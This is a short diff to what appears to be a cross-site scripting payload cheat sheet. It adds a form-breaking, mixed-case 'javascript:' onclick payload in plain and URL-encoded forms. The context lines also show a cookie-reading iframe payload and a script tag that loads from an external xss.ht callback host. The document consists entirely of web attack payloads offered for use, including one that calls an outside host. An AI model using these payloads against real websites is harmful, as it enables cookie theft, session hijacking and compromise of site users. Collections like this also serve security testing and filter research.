@@ -95,6 +95,9 @@ tes/><iframe src-javascript:prompt(document.cookie)>
 
 <html><head><script src="//narayananm.xss.ht"></script></head><body></body></html>
 
+batman"></form><div class="inner product-tab"><h3><jAvAsCrIpT: onclick=location=tagName BinnerHTML Blocation.hash>/*click me!#*/alert(1)
+batman"></form><div%20class="inner%20product-tab"><h3><jAvAsCrIpT:%20onclick=location=tagName%20BinnerHTML%20Blocation.hash>/*click%20me!#*/alert(1)
+
 ```
 
 svg file upload
